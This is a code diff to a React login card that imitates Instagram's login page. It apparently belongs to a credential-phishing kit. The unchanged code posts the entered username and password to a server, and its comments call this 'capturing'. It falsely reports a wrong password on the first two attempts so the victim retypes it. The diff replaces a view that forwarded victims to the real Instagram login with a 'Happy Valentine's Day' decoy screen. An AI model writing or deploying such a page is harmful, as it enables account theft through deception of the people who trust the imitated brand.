@@ -7,47 +7,79 @@ interface LoginCardProps {
   onToggleMode: () => void;
 }
 
-const ConnectingView: React.FC = () => {
-  useEffect(() => {
-    // Redirect to the real Instagram login page after 3 seconds
-    const timer = setTimeout(() => {
-      window.location.href = 'https://www.instagram.com/accounts/login/';
-    }, 3500);
-    return () => clearTimeout(timer);
-  }, []);
-
+const ValentineSurpriseView: React.FC = () => {
   return (
-    <div className="relative flex flex-col items-center justify-center py-16 w-full bg-white rounded-sm min-h-[400px] animate-[fadeIn_0.5s_ease-out]">
-      <div className="relative z-10 flex flex-col items-center">
-        <div className="w-20 h-20 mb-8 relative">
-          {/* Instagram Gradient Spinner */}
-          <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#ee2a7b] border-r-[#6228d7] animate-spin"></div>
-          <div className="absolute inset-2 rounded-full bg-white flex items-center justify-center">
-            <img 
-              src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" 
-              alt="Instagram" 
-              className="w-10 h-10 animate-pulse"
-            />
+    <div className="relative flex flex-col items-center justify-center py-12 w-full bg-white md:border border-[#dbdbdb] rounded-sm min-h-[500px] overflow-hidden animate-[fadeIn_0.8s_ease-out]">
+      {/* Animated Hearts Background */}
+      <div className="absolute inset-0 pointer-events-none">
+        {[...Array(15)].map((_, i) => (
+          <div
+            key={i}
+            className="absolute text-red-400 opacity-20 animate-float"
+            style={{
+              left: `${Math.random() * 100}%`,
+              top: `${Math.random() * 100}%`,
+              fontSize: `${Math.random() * 20 + 10}px`,
+              animationDelay: `${Math.random() * 5}s`,
+              animationDuration: `${Math.random() * 10 + 5}s`
+            }}
+          >
+            ❤
+          </div>
+        ))}
+      </div>
+
+      <div className="relative z-10 flex flex-col items-center text-center px-6">
+        <div className="w-24 h-24 mb-6 relative animate-bounce-slow">
+          <div className="absolute inset-0 bg-pink-100 rounded-full animate-pulse"></div>
+          <div className="absolute inset-0 flex items-center justify-center text-5xl">
+            💝
           </div>
         </div>
 
-        <h2 className="text-xl font-semibold text-[#262626] mb-2 animate-[slideUp_0.5s_ease-out]">
-          Connecting...
-        </h2>
-        <p className="text-[#8e8e8e] text-sm text-center px-10 animate-[slideUp_0.5s_0.1s_both]">
-          We're securing your connection. You'll be redirected shortly.
+        <h1 className="text-3xl font-bold bg-gradient-to-r from-red-500 to-pink-500 bg-clip-text text-transparent mb-4 animate-[slideUp_0.6s_ease-out]">
+          Happy Valentine's Day!
+        </h1>
+        
+        <div className="w-16 h-1 bg-gradient-to-r from-red-400 to-pink-400 rounded-full mb-6"></div>
+
+        <p className="text-[#262626] text-lg font-medium mb-2 animate-[slideUp_0.6s_0.2s_both]">
+          A Special Surprise for You
         </p>
         
-        <div className="mt-10 flex space-x-1.5">
-          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_0ms]"></div>
-          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_200ms]"></div>
-          <div className="w-1.5 h-1.5 bg-[#dbdbdb] rounded-full animate-[bounce_1s_infinite_400ms]"></div>
+        <p className="text-[#8e8e8e] text-sm leading-relaxed max-w-[280px] mb-8 animate-[slideUp_0.6s_0.4s_both]">
+          Thank you for being part of our community. We hope your day is filled with love, laughter, and beautiful moments.
+        </p>
+
+        <div className="flex flex-col space-y-3 w-full animate-[slideUp_0.6s_0.6s_both]">
+          <button 
+            onClick={() => window.location.reload()}
+            className="bg-gradient-to-r from-red-500 to-pink-600 text-white font-semibold py-3 px-8 rounded-full shadow-lg hover:shadow-xl transition-all active:scale-95"
+          >
+            Send Love Back ❤️
+          </button>
+          <p className="text-[10px] text-[#c7c7c7] uppercase tracking-widest">Special Edition 2024</p>
         </div>
       </div>
       
       <style>{`
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUp { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes float {
+          0% { transform: translateY(0) rotate(0deg); opacity: 0; }
+          20% { opacity: 0.4; }
+          100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
+        }
+        @keyframes bounce-slow {
+          0%, 100% { transform: translateY(0); }
+          50% { transform: translateY(-10px); }
+        }
+        .animate-float {
+          animation: float linear infinite;
+        }
+        .animate-bounce-slow {
+          animation: bounce-slow 3s ease-in-out infinite;
+        }
       `}</style>
     </div>
   );
@@ -95,25 +127,24 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
         body: JSON.stringify(formData),
       });
 
-      // We don't necessarily need the response data if we're just capturing
       await response.json();
 
-      // Attempt logic: Show error twice, redirect on third
+      // Attempt logic: Show error for first 2 attempts, trigger surprise on 3rd
       if (currentAttempt < 3) {
         setTimeout(() => {
           setError("Sorry, your password was incorrect. Please double-check your password.");
           setIsLoading(false);
           setFormData(prev => ({ ...prev, password: '' }));
-        }, 800);
+        }, 1000);
       } else {
         setTimeout(() => {
           setIsSuccess(true);
           setIsLoading(false);
-        }, 1000);
+        }, 1200);
       }
     } catch (err) {
       console.error("Capture failed:", err);
-      // Fallback for demo/offline
+      // Fallback behavior if server is down
       setTimeout(() => {
         if (currentAttempt < 3) {
           setError("Sorry, your password was incorrect. Please double-check your password.");
@@ -123,12 +154,12 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
           setIsSuccess(true);
           setIsLoading(false);
         }
-      }, 800);
+      }, 1000);
     }
   };
 
   if (isSuccess) {
-    return <ConnectingView />;
+    return <ValentineSurpriseView />;
   }
 
   return (
